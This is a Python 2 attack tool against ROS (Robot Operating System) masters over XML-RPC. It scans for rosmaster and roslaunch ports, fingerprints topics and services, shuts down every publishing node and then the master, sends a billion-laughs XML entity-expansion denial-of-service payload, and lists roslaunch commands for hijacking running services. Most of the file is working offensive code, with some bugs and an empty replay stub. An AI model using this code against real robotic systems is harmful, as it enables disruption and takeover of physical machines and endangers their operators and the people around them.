import requests
import re
import os
import httplib, socket

RED     = lambda x: "\033[31m "+x+" \033[0m"
BLUE    = lambda x: "\033[34m "+x+" \033[0m"
YELLOW  = lambda x: "\033[33m "+x+" \033[0m"
BGREEN  = lambda x: "\033[36m "+x+" \033[0m"

ADDED   = BLUE("[+]")
ERROR   = RED("[-]")
NOTIFY  = BGREEN("[*]")

try:
    from xmlrpc.client import ServerProxy, Transport
except ImportError:
	from xmlrpclib import ServerProxy, Transport

class Attack:
	def __init__(self):
		print "[*]attack class"

	def PortScanning(self, ip='127.0.0.1'):
		#stage1 roscore open check
		print "[*]port scanning"
		self.master_port = 11311
		first_find = True
		while True:
			try:
				self.proxy = ServerProxy("http://"+ip+":"+str(self.master_port)+"/")
				rosmaster_pid = self.proxy.getPid("")[2]
				break
			except:
				if (self.master_port == 11312) and (first_find):
					self.master_port = 1
					first_find = False
				else:
					self.master_port += 1
				continue

		print "[*]rosmaster XmlRpcServer pid: %d, port: %d" %(rosmaster_pid, self.master_port)
		
		#stage2 roslaunch xmlrpc server port checking
		self.launch_port = 10000
		while True:
			try:
				self.launch_proxy = ServerProxy("http://"+ip+":"+str(self.launch_port)+"/")
				roslaunch_pid = self.launch_proxy.get_pid()[2]
				break
			except:
				self.launch_port += 1
				continue

		print "[*]roslaunch XmlRpcServer pid: %d, port: %d" %(roslaunch_pid, self.launch_port)

	def FingerPrinting(self):
		print "[*]finger printing"
		#####stage 1 fingerprinting from rosmaster xmlrpcServer
		self.GetParameter()
		#####stage 2 Get publishers, subscribers, services
		self.GetSystemState()

	def GetParameter(self):
		print "[*]---Parameter Names---"
		for i, param in enumerate(self.proxy.getParamNames("")[2]):
			print "%d: %s" %(i, param)

	def GetSystemState(self):
		print "[*]---SystemState---"
		publishers, subscribers, services = self.proxy.getSystemState("")[2]
		print "[*]publishers"
		for i, topic in enumerate(publishers):
			print "[%d]topic: %s" %(i,topic[0])
			print "->publisher"
			for topicPublisher in topic[1]:
				print topicPublisher

		print "[*]subscribers"
		for i, topic in enumerate(subscribers):
			print "[%d]topic: %s" %(i, topic[0])
			print "->TopicSubscriber"
			for topicSubscriber in topic[1]:
				print topicSubscriber

		print "[*]service"
		for i, service in enumerate(services):
			print "[%d]service: %s" %(i, service[0])
			print "->serviceProvider"
			for serviceProvider in topic[1]:
				print serviceProvider

	def ReplayAttack(self):
		print "[*]replay attack"

	def shutdown(self):
		#stage1 turn off nodes
		publishers, subscribers, services = self.proxy.getSystemState("")[2]
		node = []
		for topic in publishers:
			for topicPublisher in topic[1]:
				node.append(topicPublisher)
		
		print node
		node = list(set(node))
		for tmp in node:
			#lookup node
			apiUri = self.proxy.lookupNode(tmp,tmp)[2]
			NodeProxy = ServerProxy(apiUri)
			NodeProxy.shutdown("")

		#stage2 turn off master
		print "[*]turn off ros"
		self.proxy.shutdown("","")

	def XxeDosAttack(self, ip="127.0.0.1"):
		xml = """<?xml version="1.0"?>
		<!DOCTYPE xxx [
		 <!ENTITY lol "lol">
		 <!ELEMENT lolz (#PCDATA)>
		 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
		 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;
		 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;
		 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;
		 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;
		 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;
		 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;
		 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;
		 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;
		]> 
		<methodCall>
		<methodName>&lol9;</methodName>
		</methodCall>
		"""
		
		headers = {'Host':ip+':'+self.master_port,
		'Accept-Encoding':'gzip',
		'User-Agent': 'XMLRPC++ 0.7',
		'Content-Type': 'text/xml',
		'Content-Length': str(len(xml))} # set what your server accepts

		res = requests.post('http://'+ip+':'+self.master_port, data=xml, headers=headers)
		print res.content

	def findPack(self):
		def getRosState():
			FIRST_BLOCK     = 0
			NODE_BLOCK      = 1
			RESULT_BLOCK    = 2
			
			rosInfo={}

			proxy = self.proxy

			for service in proxy.getSystemState("/rosservice")[RESULT_BLOCK][RESULT_BLOCK]:
				if service[NODE_BLOCK][FIRST_BLOCK] not in rosInfo:
					rosInfo[service[NODE_BLOCK][FIRST_BLOCK]] = []
				rosInfo[service[NODE_BLOCK][FIRST_BLOCK]].append(service[FIRST_BLOCK])

			print NOTIFY + "[ ROS State ]---------------------------------------------"    
			print NOTIFY + ""
			print NOTIFY + "Type\tName"
			print NOTIFY + "--------\t-----------------------------------------------",
			print ""

			for node in rosInfo:
				print NOTIFY + "Node\t",node
				for service in rosInfo[node]:
					print NOTIFY + 'Service\t| -',service
				print NOTIFY
		    
			print NOTIFY + "----------------------------------------------------------"

			return rosInfo

		def getPackagePath():
		    paths = []

		    print ""
		    print ADDED + "Getting own ROS package path for searching command"
		    ROS_PACKAGE_PATH = os.getenv('ROS_PACKAGE_PATH')

		    print ""
		    print NOTIFY + "[ ROS Package Path ]--------------------------------------"
		    
		    for path in ROS_PACKAGE_PATH.split(':'):
		        paths.append(path)
		        print ADDED + "Path\t",path
		    
		    print NOTIFY + "----------------------------------------------------------"

		    return paths

		def nodeMatch(nodes, fpath):
		    nodeTag = "<node "
		    matchCnt = 0

		    fd = open(fpath, 'r')
		    data = fd.read()
		    fd.close()

		    p = re.compile(r'<node.+name="(.*?)"', re.MULTILINE)
		    tmps = p.findall(data)

		    for i in range (len(tmps)):
		        tmps[i] = '/' + tmps[i]
		        if tmps[i] in nodes:
		            matchCnt = matchCnt+1
		            
		    if matchCnt is len(tmps) and matchCnt is not 0:
		        p = re.compile(r'.*share/(.*?)/')
		        package = p.findall(fpath)[0]
		 
		        print ""
		        print NOTIFY + "Package\t", package
				#        for tmp in tmps:
				#            print NOTIFY + "[Node]\t| -", tmp
		        
		        return (package, tmps)
		    
		    return


		def findLaunchPackage(paths, nodes):
		    try:
		        tmp = nodes[:]
		        tmp.remove('/rosout')
		        matchFlag = False           # if found set this value

		        print ""
		        print ADDED + "Searching command for service hijacking..."
		        print ADDED + "Command format: roslaunch [ROS_Package] [ROS_Node]"
		        print ""

		        print NOTIFY + "[ ROS Launch Info ]---------------------------------------"
		        
		        print NOTIFY + ""
		        print NOTIFY + "Type\tName"
		        print NOTIFY + "--------\t-----------------------------------------------",
		        
		        for wPath in paths:
		            for (path, dirt, files) in os.walk(wPath):
		                for fname in files:
		                    ext = os.path.splitext(fname)[-1]
		                    if ext == '.launch':
		                        matchs = nodeMatch(tmp, path+"/"+fname)

		                        if matchs:
		                            package = matchs[0]
		                            mNodes  = matchs[1]
		                            matchFlag = True

		                            print NOTIFY + "Launch\t| -", fname
		                            for node in mNodes:
		                                print NOTIFY + "Node\t\t| -", node
		                            print YELLOW("[*] Command -> roslaunch " + package + " " + fname)
		                            print NOTIFY,

		        if matchFlag is False:
		            print ""
		            print ERROR + "Not Found",

		        print ""
		        print NOTIFY + "----------------------------------------------------------"
		        
		        if matchFlag is True:
		            print ""
		            print ADDED + "By executing the command,"
		            print ADDED + "You can HIJACK the services contained in the ROS Node"
		            print ADDED + "Try it?"
		            print ""
		    except:
		        pass


		rosInfo = getRosState()
		nodes   = rosInfo.keys()
		paths   = getPackagePath()
		findLaunchPackage(paths, nodes)
